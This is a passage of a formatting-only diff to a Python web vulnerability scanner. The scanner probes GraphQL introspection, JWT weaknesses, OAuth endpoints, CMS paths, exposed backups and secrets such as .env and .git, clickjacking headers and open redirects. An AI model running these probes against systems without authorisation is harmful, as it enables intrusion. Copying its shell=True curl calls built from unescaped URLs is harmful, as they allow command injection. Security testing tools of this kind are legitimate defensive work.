                         types = schema_data.get("data", {}).get("__schema", {}).get("types", [])
                         query_type = schema_data.get("data", {}).get("__schema", {}).get("queryType", {}).get("name")
-                        mutation_type = schema_data.get("data", {}).get("__schema", {}).get("mutationType", {}).get("name")
+                        mutation_type = (
+                            schema_data.get("data", {}).get("__schema", {}).get("mutationType", {}).get("name")
+                        )
 
-                        results.append({
-                            "endpoint": test_url,
-                            "introspection": True,
-                            "query_type": query_type,
-                            "mutation_type": mutation_type,
-                            "types_count": len(types),
-                            "severity": "critical"
-                        })
+                        results.append(
+                            {
+                                "endpoint": test_url,
+                                "introspection": True,
+                                "query_type": query_type,
+                                "mutation_type": mutation_type,
+                                "types_count": len(types),
+                                "severity": "critical",
+                            }
+                        )
                         self.log(f"Introspection enabled at {test_url}: {len(types)} types", "warning")
 
-                        interesting_types = [t for t in types if not t["name"].startswith("__") and t["kind"] == "OBJECT"]
+                        interesting_types = [
+                            t for t in types if not t["name"].startswith("__") and t["kind"] == "OBJECT"
+                        ]
                         for t in interesting_types[:10]:
                             fields = t.get("fields", [])
                             self.log(f"Type: {t['name']} ({len(fields)} fields)", "info")
@@ -1078,12 +1133,14 @@ class WebExplorer:
                         pass
 
                 elif "introspection" in body.lower() and "disabled" in body.lower():
-                    results.append({
-                        "endpoint": test_url,
-                        "introspection": False,
-                        "evidence": "Introspection explicitly disabled",
-                        "severity": "info"
-                    })
+                    results.append(
+                        {
+                            "endpoint": test_url,
+                            "introspection": False,
+                            "evidence": "Introspection explicitly disabled",
+                            "severity": "info",
+                        }
+                    )
 
             except Exception as e:
                 self.log(f"GraphQL test error for {path}: {str(e)}", "error")
@@ -1102,26 +1159,29 @@ class WebExplorer:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
             full_output = result.stdout + result.stderr
 
-            jwt_pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+'
+            jwt_pattern = r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+"
             tokens = re.findall(jwt_pattern, full_output)
 
-            cookie_jwt_pattern = r'(?:token|jwt|auth|session)=?(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+)'
+            cookie_jwt_pattern = (
+                r"(?:token|jwt|auth|session)=?(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+)"
+            )
             cookie_tokens = re.findall(cookie_jwt_pattern, full_output, re.IGNORECASE)
 
             all_tokens = list(set(tokens + cookie_tokens))
 
             for token in all_tokens:
                 try:
-                    parts = token.split('.')
+                    parts = token.split(".")
                     if len(parts) != 3:
                         continue
 
                     import base64
-                    def pad_b64(s):
-                        return s + '=' * (4 - len(s) % 4)
 
-                    header_b64 = pad_b64(parts[0].replace('-', '+').replace('_', '/'))
-                    payload_b64 = pad_b64(parts[1].replace('-', '+').replace('_', '/'))
+                    def pad_b64(s):
+                        return s + "=" * (4 - len(s) % 4)
+
+                    header_b64 = pad_b64(parts[0].replace("-", "+").replace("_", "/"))
+                    payload_b64 = pad_b64(parts[1].replace("-", "+").replace("_", "/"))
 
                     header = json.loads(base64.b64decode(header_b64))
                     payload = json.loads(base64.b64decode(payload_b64))
@@ -1130,60 +1190,74 @@ class WebExplorer:
 
                     alg = header.get("alg", "").upper()
                     if alg == "NONE":
-                        issues.append({
-                            "issue": "Algorithm none",
-                            "severity": "critical",
-                            "detail": "JWT accepts 'none' algorithm - signature bypass possible"
-                        })
+                        issues.append(
+                            {
+                                "issue": "Algorithm none",
+                                "severity": "critical",
+                                "detail": "JWT accepts 'none' algorithm - signature bypass possible",
+                            }
+                        )
                     elif alg in ("HS256", "HS384", "HS512"):
-                        issues.append({
-                            "issue": "Symmetric algorithm",
-                            "severity": "medium",
-                            "detail": f"HMAC algorithm {alg} used - key brute-force possible"
-                        })
+                        issues.append(
+                            {
+                                "issue": "Symmetric algorithm",
+                                "severity": "medium",
+                                "detail": f"HMAC algorithm {alg} used - key brute-force possible",
+                            }
+                        )
 
                     if "exp" not in payload:
-                        issues.append({
-                            "issue": "No expiration",
-                            "severity": "medium",
-                            "detail": "JWT has no expiration claim"
-                        })
+                        issues.append(
+                            {"issue": "No expiration", "severity": "medium", "detail": "JWT has no expiration claim"}
+                        )
                     elif payload.get("exp"):
                         exp_dt = datetime.fromtimestamp(payload["exp"])
                         if exp_dt < datetime.now():
-                            issues.append({
-                                "issue": "Expired token",
-                                "severity": "low",
-                                "detail": f"Token expired at {exp_dt.isoformat()}"
-                            })
+                            issues.append(
+                                {
+                                    "issue": "Expired token",
+                                    "severity": "low",
+                                    "detail": f"Token expired at {exp_dt.isoformat()}",
+                                }
+                            )
 
                     if payload.get("iat"):
                         iat_dt = datetime.fromtimestamp(payload["iat"])
                         if (datetime.now() - iat_dt).days > 365:
-                            issues.append({
-                                "issue": "Old token",
-                                "severity": "low",
-                                "detail": f"Token issued over a year ago: {iat_dt.isoformat()}"
-                            })
+                            issues.append(
+                                {
+                                    "issue": "Old token",
+                                    "severity": "low",
+                                    "detail": f"Token issued over a year ago: {iat_dt.isoformat()}",
+                                }
+                            )
 
                     sensitive_claims = ["password", "secret", "key", "token", "ssn", "credit"]
                     for claim in payload:
                         if any(s in claim.lower() for s in sensitive_claims):
-                            issues.append({
-                                "issue": f"Sensitive claim: {claim}",
-                                "severity": "high",
-                                "detail": f"JWT payload contains potentially sensitive claim: {claim}"
-                            })
+                            issues.append(
+                                {
+                                    "issue": f"Sensitive claim: {claim}",
+                                    "severity": "high",
+                                    "detail": f"JWT payload contains potentially sensitive claim: {claim}",
+                                }
+                            )
 
-                    results.append({
-                        "token": token[:50] + "...",
-                        "header": header,
-                        "payload_claims": list(payload.keys()),
-                        "issues": issues,
-                        "severity": "critical" if any(i["severity"] == "critical" for i in issues) else
-                                  "high" if any(i["severity"] == "high" for i in issues) else
-                                  "medium" if any(i["severity"] == "medium" for i in issues) else "low"
-                    })
+                    results.append(
+                        {
+                            "token": token[:50] + "...",
+                            "header": header,
+                            "payload_claims": list(payload.keys()),
+                            "issues": issues,
+                            "severity": "critical"
+                            if any(i["severity"] == "critical" for i in issues)
+                            else "high"
+                            if any(i["severity"] == "high" for i in issues)
+                            else "medium"
+                            if any(i["severity"] == "medium" for i in issues)
+                            else "low",
+                        }
+                    )
 
                     for issue in issues:
                         self.log(f"JWT issue: {issue['issue']} - {issue['detail']}", "warning")
@@ -1207,12 +1281,20 @@ class WebExplorer:
         results = []
 
         oauth_paths = [
-            "/oauth/authorize", "/oauth/token", "/oauth/callback",
-            "/auth/authorize", "/auth/token", "/auth/callback",
-            "/oauth2/authorize", "/oauth2/token", "/oauth2/callback",
+            "/oauth/authorize",
+            "/oauth/token",
+            "/oauth/callback",
+            "/auth/authorize",
+            "/auth/token",
+            "/auth/callback",
+            "/oauth2/authorize",
+            "/oauth2/token",
+            "/oauth2/callback",
             "/.well-known/openid-configuration",
             "/openid-configuration",
-            "/authorize", "/token", "/callback",
+            "/authorize",
+            "/token",
+            "/callback",
         ]
 
         parsed = urlparse(url)
@@ -1223,16 +1305,13 @@ class WebExplorer:
                 test_url = f"{base_url}{path}"
                 cmd = f"curl -sI --max-time 5 '{test_url}'"
                 result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
-                status_line = result.stdout.split('\n')[0] if result.stdout else ""
+                status_line = result.stdout.split("\n")[0] if result.stdout else ""
                 status_code = status_line.split()[1] if len(status_line.split()) > 1 else "000"
 
                 if status_code in ("200", "301", "302", "303", "307"):
-                    results.append({
-                        "endpoint": test_url,
-                        "status": status_code,
-                        "type": "oauth_endpoint",
-                        "severity": "info"
-                    })
+                    results.append(
+                        {"endpoint": test_url, "status": status_code, "type": "oauth_endpoint", "severity": "info"}
+                    )
                     self.log(f"OAuth endpoint found: {path} [{status_code}]", "info")
 
             except Exception:
@@ -1243,17 +1322,19 @@ class WebExplorer:
             cmd = f"curl -s --max-time 10 '{oidc_url}'"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
 
-            if result.stdout.strip().startswith('{'):
+            if result.stdout.strip().startswith("{"):
                 oidc_config = json.loads(result.stdout)
-                results.append({
-                    "type": "openid_config",
-                    "issuer": oidc_config.get("issuer"),
-                    "authorization_endpoint": oidc_config.get("authorization_endpoint"),
-                    "token_endpoint": oidc_config.get("token_endpoint"),
-                    "userinfo_endpoint": oidc_config.get("userinfo_endpoint"),
-                    "jwks_uri": oidc_config.get("jwks_uri"),
-                    "severity": "info"
-                })
+                results.append(
+                    {
+                        "type": "openid_config",
+                        "issuer": oidc_config.get("issuer"),
+                        "authorization_endpoint": oidc_config.get("authorization_endpoint"),
+                        "token_endpoint": oidc_config.get("token_endpoint"),
+                        "userinfo_endpoint": oidc_config.get("userinfo_endpoint"),
+                        "jwks_uri": oidc_config.get("jwks_uri"),
+                        "severity": "info",
+                    }
+                )
                 self.log("OpenID Connect configuration found", "info")
 
         except json.JSONDecodeError:
@@ -1268,13 +1349,15 @@ class WebExplorer:
                 if auth_endpoint:
                     parsed_auth = urlparse(auth_endpoint)
                     if parsed_auth.scheme == "http" and parsed_auth.hostname not in ("localhost", "127.0.0.1"):
-                        results.append({
-                            "type": "oauth_issue",
-                            "issue": "HTTP authorization endpoint",
-                            "endpoint": auth_endpoint,
-                            "severity": "high",
-                            "recommendation": "Use HTTPS for OAuth endpoints"
-                        })
+                        results.append(
+                            {
+                                "type": "oauth_issue",
+                                "issue": "HTTP authorization endpoint",
+                                "endpoint": auth_endpoint,
+                                "severity": "high",
+                                "recommendation": "Use HTTPS for OAuth endpoints",
+                            }
+                        )
 
         self.results["oauth"] = results
         self.log(f"OAuth testing completed: {len(results)} findings", "info")
@@ -1318,14 +1401,18 @@ class WebExplorer:
                 status = result.stdout.strip().strip("'")
 
                 if status not in ("404", "000"):
-                    severity = "high" if path in ("/xmlrpc.php", "/wp-json/wp/v2/users", "/wp-config.php.bak") else "info"
-                    results.append({
-                        "path": path,
-                        "url": test_url,
-                        "status": status,
-                        "description": description,
-                        "severity": severity
-                    })
+                    severity = (
+                        "high" if path in ("/xmlrpc.php", "/wp-json/wp/v2/users", "/wp-config.php.bak") else "info"
+                    )
+                    results.append(
+                        {
+                            "path": path,
+                            "url": test_url,
+                            "status": status,
+                            "description": description,
+                            "severity": severity,
+                        }
+                    )
                     self.log(f"WP: {description} [{status}]", "success" if status == "200" else "info")
 
             except Exception as e:
@@ -1338,21 +1425,19 @@ class WebExplorer:
             version_match = re.search(r'content="WordPress\s+([\d.]+)"', result.stdout)
             if version_match:
                 version = version_match.group(1)
-                results.append({
-                    "type": "version_disclosure",
-                    "version": version,
-                    "severity": "medium",
-                    "recommendation": "Remove WordPress version from meta tags"
-                })
+                results.append(
+                    {
+                        "type": "version_disclosure",
+                        "version": version,
+                        "severity": "medium",
+                        "recommendation": "Remove WordPress version from meta tags",
+                    }
+                )
                 self.log(f"WordPress version: {version}", "info")
 
             generator_match = re.search(r'<meta name="generator" content="WordPress\s+([\d.]+)"', result.stdout)
             if generator_match:
-                results.append({
-                    "type": "generator_meta",
-                    "version": generator_match.group(1),
-                    "severity": "low"
-                })
+                results.append({"type": "generator_meta", "version": generator_match.group(1), "severity": "low"})
 
         except Exception as e:
             self.log(f"WP version check error: {str(e)}", "error")
@@ -1403,13 +1488,15 @@ class WebExplorer:
 
                 if status not in ("404", "000"):
                     severity = "high" if path in ("/sites/default/settings.php",) else "info"
-                    results.append({
-                        "path": path,
-                        "url": test_url,
-                        "status": status,
-                        "description": description,
-                        "severity": severity
-                    })
+                    results.append(
+                        {
+                            "path": path,
+                            "url": test_url,
+                            "status": status,
+                            "description": description,
+                            "severity": severity,
+                        }
+                    )
                     self.log(f"Drupal: {description} [{status}]", "success" if status == "200" else "info")
 
             except Exception as e:
@@ -1421,7 +1508,7 @@ class WebExplorer:
             body = result.stdout
 
             version_patterns = [
-                r'Drupal\s+([\d.]+)',
+                r"Drupal\s+([\d.]+)",
                 r'content="Drupal\s+([\d.]+)"',
                 r'Drupal\.settings\s*=\s*\{[^}]*"version"\s*:\s*"([\d.]+)"',
             ]
@@ -1430,12 +1517,14 @@ class WebExplorer:
                 match = re.search(pattern, body, re.IGNORECASE)
                 if match:
                     version = match.group(1)
-                    results.append({
-                        "type": "version_disclosure",
-                        "version": version,
-                        "severity": "medium",
-                        "recommendation": "Update Drupal to the latest version"
-                    })
+                    results.append(
+                        {
+                            "type": "version_disclosure",
+                            "version": version,
+                            "severity": "medium",
+                            "recommendation": "Update Drupal to the latest version",
+                        }
+                    )
                     self.log(f"Drupal version: {version}", "info")
                     break
 
@@ -1489,13 +1578,15 @@ class WebExplorer:
 
                 if status not in ("404", "000"):
                     severity = "high" if path in ("/configuration.php", "/configuration.php.dist") else "info"
-                    results.append({
-                        "path": path,
-                        "url": test_url,
-                        "status": status,
-                        "description": description,
-                        "severity": severity
-                    })
+                    results.append(
+                        {
+                            "path": path,
+                            "url": test_url,
+                            "status": status,
+                            "description": description,
+                            "severity": severity,
+                        }
+                    )
                     self.log(f"Joomla: {description} [{status}]", "success" if status == "200" else "info")
 
             except Exception as e:
@@ -1507,7 +1598,7 @@ class WebExplorer:
             body = result.stdout
 
             version_patterns = [
-                r'Joomla!\s+([\d.]+)',
+                r"Joomla!\s+([\d.]+)",
                 r'content="Joomla!\s+([\d.]+)"',
                 r'"version"\s*:\s*"([\d.]+)"',
             ]
@@ -1516,22 +1607,20 @@ class WebExplorer:
                 match = re.search(pattern, body, re.IGNORECASE)
                 if match:
                     version = match.group(1)
-                    results.append({
-                        "type": "version_disclosure",
-                        "version": version,
-                        "severity": "medium",
-                        "recommendation": "Update Joomla to the latest version"
-                    })
+                    results.append(
+                        {
+                            "type": "version_disclosure",
+                            "version": version,
+                            "severity": "medium",
+                            "recommendation": "Update Joomla to the latest version",
+                        }
+                    )
                     self.log(f"Joomla version: {version}", "info")
                     break
 
             generator_match = re.search(r'<meta name="generator" content="([^"]+)"', body)
             if generator_match and "joomla" in generator_match.group(1).lower():
-                results.append({
-                    "type": "generator_meta",
-                    "content": generator_match.group(1),
-                    "severity": "low"
-                })
+                results.append({"type": "generator_meta", "content": generator_match.group(1), "severity": "low"})
 
         except Exception as e:
             self.log(f"Joomla version check error: {str(e)}", "error")
@@ -1546,19 +1635,46 @@ class WebExplorer:
         results = []
 
         backup_extensions = [
-            ".bak", ".old", ".orig", ".save", ".swp", ".swo",
-            ".backup", ".copy", ".tmp", ".temp",
-            ".tar.gz", ".tar.bz2", ".zip", ".rar", ".7z",
-            ".sql", ".sql.gz", ".sql.bak", ".dump",
-            "~", ".save", ".sav",
+            ".bak",
+            ".old",
+            ".orig",
+            ".save",
+            ".swp",
+            ".swo",
+            ".backup",
+            ".copy",
+            ".tmp",
+            ".temp",
+            ".tar.gz",
+            ".tar.bz2",
+            ".zip",
+            ".rar",
+            ".7z",
+            ".sql",
+            ".sql.gz",
+            ".sql.bak",
+            ".dump",
+            "~",
+            ".save",
+            ".sav",
         ]
 
         common_files = [
-            "index.php", "config.php", "wp-config.php", ".htaccess",
-            "web.config", "settings.py", "application.properties",
-            "database.yml", "config.yml", "config.json",
-            "configuration.php", "settings.php",
-            ".env", "config.inc.php", "config.ini",
+            "index.php",
+            "config.php",
+            "wp-config.php",
+            ".htaccess",
+            "web.config",
+            "settings.py",
+            "application.properties",
+            "database.yml",
+            "config.yml",
+            "config.json",
+            "configuration.php",
+            "settings.php",
+            ".env",
+            "config.inc.php",
+            "config.ini",
         ]
 
         parsed = urlparse(url)
@@ -1573,23 +1689,37 @@ class WebExplorer:
                     status = result.stdout.strip().strip("'")
 
                     if status in ("200", "301", "302"):
-                        results.append({
-                            "file": f"{filename}{ext}",
-                            "url": test_url,
-                            "status": status,
-                            "severity": "high",
-                            "recommendation": "Remove backup files from web root"
-                        })
+                        results.append(
+                            {
+                                "file": f"{filename}{ext}",
+                                "url": test_url,
+                                "status": status,
+                                "severity": "high",
+                                "recommendation": "Remove backup files from web root",
+                            }
+                        )
                         self.log(f"Backup found: {filename}{ext} [{status}]", "warning")
 
                 except Exception:
                     pass
 
         directory_paths = [
-            "/backup/", "/backups/", "/bak/", "/old/", "/temp/",
-            "/db/", "/database/", "/sql/", "/dump/",
-            "/exports/", "/archives/", "/data/",
-            "/.git/", "/.svn/", "/.hg/", "/.bzr/",
+            "/backup/",
+            "/backups/",
+            "/bak/",
+            "/old/",
+            "/temp/",
+            "/db/",
+            "/database/",
+            "/sql/",
+            "/dump/",
+            "/exports/",
+            "/archives/",
+            "/data/",
+            "/.git/",
+            "/.svn/",
+            "/.hg/",
+            "/.bzr/",
         ]
 
         for path in directory_paths:
@@ -1601,13 +1731,15 @@ class WebExplorer:
 
                 if status in ("200", "301", "302"):
                     severity = "critical" if path in ("/.git/", "/.svn/", "/.hg/", "/.bzr/") else "high"
-                    results.append({
-                        "file": path,
-                        "url": test_url,
-                        "status": status,
-                        "severity": severity,
-                        "recommendation": f"Remove {path} directory from web root"
-                    })
+                    results.append(
+                        {
+                            "file": path,
+                            "url": test_url,
+                            "status": status,
+                            "severity": severity,
+                            "recommendation": f"Remove {path} directory from web root",
+                        }
+                    )
                     self.log(f"Sensitive directory: {path} [{status}]", "warning")
 
             except Exception:
@@ -1671,14 +1803,16 @@ class WebExplorer:
                     else:
                         severity = "high"
 
-                    results.append({
-                        "path": path,
-                        "name": name,
-                        "description": description,
-                        "url": test_url,
-                        "content_preview": body[:200].strip(),
-                        "severity": severity
-                    })
+                    results.append(
+                        {
+                            "path": path,
+                            "name": name,
+                            "description": description,
+                            "url": test_url,
+                            "content_preview": body[:200].strip(),
+                            "severity": severity,
+                        }
+                    )
                     self.log(f"Source disclosure: {description}", "warning")
 
             except Exception as e:
@@ -1690,15 +1824,17 @@ class WebExplorer:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
 
             if "Disallow:" in result.stdout:
-                disallowed = re.findall(r'Disallow:\s*(.+)', result.stdout)
+                disallowed = re.findall(r"Disallow:\s*(.+)", result.stdout)
                 for item in disallowed:
-                    if any(s in item.lower() for s in ['admin', 'config', 'backup', 'db', '.git', '.env']):
-                        results.append({
-                            "path": item.strip(),
-                            "name": "Sensitive path in robots.txt",
-                            "description": "Sensitive path disclosed in robots.txt",
-                            "severity": "medium"
-                        })
+                    if any(s in item.lower() for s in ["admin", "config", "backup", "db", ".git", ".env"]):
+                        results.append(
+                            {
+                                "path": item.strip(),
+                                "name": "Sensitive path in robots.txt",
+                                "description": "Sensitive path disclosed in robots.txt",
+                                "severity": "medium",
+                            }
+                        )
                         self.log(f"robots.txt disclosure: {item.strip()}", "warning")
 
         except Exception:
@@ -1722,64 +1858,61 @@ class WebExplorer:
             csp_frame = None
             corp_value = None
 
-            for line in headers.split('\n'):
-                if 'x-frame-options:' in line:
-                    xfo_value = line.split(':', 1)[1].strip()
-                if 'content-security-policy:' in line:
-                    csp_header = line.split(':', 1)[1].strip()
-                    if 'frame-ancestors' in csp_header:
+            for line in headers.split("\n"):
+                if "x-frame-options:" in line:
+                    xfo_value = line.split(":", 1)[1].strip()
+                if "content-security-policy:" in line:
+                    csp_header = line.split(":", 1)[1].strip()
+                    if "frame-ancestors" in csp_header:
                         csp_frame = csp_header
-                if 'cross-origin-resource-policy:' in line:
-                    corp_value = line.split(':', 1)[1].strip()
+                if "cross-origin-resource-policy:" in line:
+                    corp_value = line.split(":", 1)[1].strip()
 
             if xfo_value:
-                if xfo_value.lower() not in ('deny', 'sameorigin'):
-                    results.append({
-                        "header": "X-Frame-Options",
-                        "value": xfo_value,
-                        "status": "weak",
-                        "severity": "medium",
-                        "recommendation": "Set X-Frame-Options to DENY or SAMEORIGIN"
-                    })
+                if xfo_value.lower() not in ("deny", "sameorigin"):
+                    results.append(
+                        {
+                            "header": "X-Frame-Options",
+                            "value": xfo_value,
+                            "status": "weak",
+                            "severity": "medium",
+                            "recommendation": "Set X-Frame-Options to DENY or SAMEORIGIN",
+                        }
+                    )
                 else:
-                    results.append({
-                        "header": "X-Frame-Options",
-                        "value": xfo_value,
-                        "status": "secure",
-                        "severity": "info"
-                    })
+                    results.append(
+                        {"header": "X-Frame-Options", "value": xfo_value, "status": "secure", "severity": "info"}
+                    )
             else:
-                results.append({
-                    "header": "X-Frame-Options",
-                    "status": "missing",
-                    "severity": "high",
-                    "recommendation": "Add X-Frame-Options: DENY or SAMEORIGIN"
-                })
+                results.append(
+                    {
+                        "header": "X-Frame-Options",
+                        "status": "missing",
+                        "severity": "high",
+                        "recommendation": "Add X-Frame-Options: DENY or SAMEORIGIN",
+                    }
+                )
                 self.log("Missing X-Frame-Options header", "warning")
 
             if csp_frame:
-                if 'none' in csp_frame or 'self' in csp_frame:
-                    results.append({
-                        "header": "CSP frame-ancestors",
-                        "value": csp_frame,
-                        "status": "secure",
-                        "severity": "info"
-                    })
+                if "none" in csp_frame or "self" in csp_frame:
+                    results.append(
+                        {"header": "CSP frame-ancestors", "value": csp_frame, "status": "secure", "severity": "info"}
+                    )
                 else:
-                    results.append({
-                        "header": "CSP frame-ancestors",
-                        "value": csp_frame,
-                        "status": "weak",
-                        "severity": "medium"
-                    })
+                    results.append(
+                        {"header": "CSP frame-ancestors", "value": csp_frame, "status": "weak", "severity": "medium"}
+                    )
 
             if not xfo_value and not csp_frame:
-                results.append({
-                    "vulnerability": "Clickjacking",
-                    "status": "vulnerable",
-                    "severity": "high",
-                    "recommendation": "Add X-Frame-Options or CSP frame-ancestors to prevent clickjacking"
-                })
+                results.append(
+                    {
+                        "vulnerability": "Clickjacking",
+                        "status": "vulnerable",
+                        "severity": "high",
+                        "recommendation": "Add X-Frame-Options or CSP frame-ancestors to prevent clickjacking",
+                    }
+                )
                 self.log("Clickjacking: No protection headers found", "warning")
 
         except Exception as e:
@@ -1795,11 +1928,28 @@ class WebExplorer:
         results = []
 
         redirect_params = [
-            "url", "next", "redirect", "redirect_url", "redirect_uri",
-            "return", "return_url", "return_to", "goto", "go",
-            "out", "view", "to", "link", "target",
-            "continue", "dest", "destination", "redir",
-            "redirect_to", "checkout_url", "return_url",
+            "url",
+            "next",
+            "redirect",
+            "redirect_url",
+            "redirect_uri",
+            "return",
+            "return_url",
+            "return_to",
+            "goto",
+            "go",
+            "out",
+            "view",
+            "to",
+            "link",
+            "target",
+            "continue",
+            "dest",
+            "destination",
+            "redir",
+            "redirect_to",
+            "checkout_url",
+            "return_url",
         ]
 
         external_domains = [
@@ -1820,19 +1970,24 @@ class WebExplorer:
                     result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                     output = result.stdout.strip()
 
-                    parts = output.split(' ', 1)
+                    parts = output.split(" ", 1)
                     final_status = parts[0] if len(parts) > 0 else ""
                     final_url = parts[1] if len(parts) > 1 else ""
 
-                    if final_url and external_url.replace("https:", "").replace("http:", "").replace("//", "") in final_url:
-                        results.append({
-                            "parameter": param,
-                            "payload": external_url,
-                            "final_url": final_url,
-                            "status": final_status,
-                            "severity": "high",
-                            "recommendation": f"Validate and sanitize {param} parameter"
-                        })
+                    if (
+                        final_url
+                        and external_url.replace("https:", "").replace("http:", "").replace("//", "") in final_url
+                    ):
+                        results.append(
+                            {
+                                "parameter": param,
+                                "payload": external_url,
+                                "final_url": final_url,
+                                "status": final_status,
+                                "severity": "high",
+                                "recommendation": f"Validate and sanitize {param} parameter",
+                            }
+                        )
                         self.log(f"Open redirect: {param} -> {final_url}", "warning")
                         break
 
@@ -1842,21 +1997,25 @@ class WebExplorer:
         parsed = urlparse(url)
         for external_url in external_domains:
             try:
-                path_parts = parsed.path.rstrip('/').split('/')
+                path_parts = parsed.path.rstrip("/").split("/")
                 if len(path_parts) > 1:
-                    redirect_path = '/'.join(path_parts[:-1]) + '/' + external_url.replace("https://", "").replace("http://", "")
+                    redirect_path = (
+                        "/".join(path_parts[:-1]) + "/" + external_url.replace("https://", "").replace("http://", "")
+                    )
                     test_url = f"{parsed.scheme}://{parsed.netloc}{redirect_path}"
                     cmd = f"curl -sI --max-time 10 -o /dev/null -w '%{{http_code}}' '{test_url}'"
                     result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                     status = result.stdout.strip().strip("'")
 
                     if status in ("301", "302", "303", "307", "308"):
-                        results.append({
-                            "type": "path_based_redirect",
-                            "path": redirect_path,
-                            "status": status,
-                            "severity": "medium"
-                        })
+                        results.append(
+                            {
+                                "type": "path_based_redirect",
+                                "path": redirect_path,
+                                "status": status,
+                                "severity": "medium",
+                            }
+                        )
 
             except Exception:
                 pass
@@ -1871,7 +2030,7 @@ class WebExplorer:
             "title": "Web Exploration Report",
             "timestamp": datetime.now().isoformat(),
             "results": self.results,
-            "summary": {}
+            "summary": {},
         }
 
         total_findings = 0
@@ -1898,13 +2057,21 @@ class WebExplorer:
             "total_findings": total_findings,
             "severity_breakdown": severity_counts,
             "categories_tested": list(self.results.keys()),
-            "risk_level": "critical" if severity_counts["critical"] > 0 else
-                          "high" if severity_counts["high"] > 0 else
-                          "medium" if severity_counts["medium"] > 0 else
-                          "low" if severity_counts["low"] > 0 else "info"
+            "risk_level": "critical"
+            if severity_counts["critical"] > 0
+            else "high"
+            if severity_counts["high"] > 0
+            else "medium"
+            if severity_counts["medium"] > 0
+            else "low"
+            if severity_counts["low"] > 0
+            else "info",
         }
 
         self.log(f"Report generated: {total_findings} total findings", "info")
-        self.log(f"Risk level: {report['summary']['risk_level']}", "warning" if report["summary"]["risk_level"] in ("critical", "high") else "info")
+        self.log(
+            f"Risk level: {report['summary']['risk_level']}",
+            "warning" if report["summary"]["risk_level"] in ("critical", "high") else "info",
+        )
 
         return report
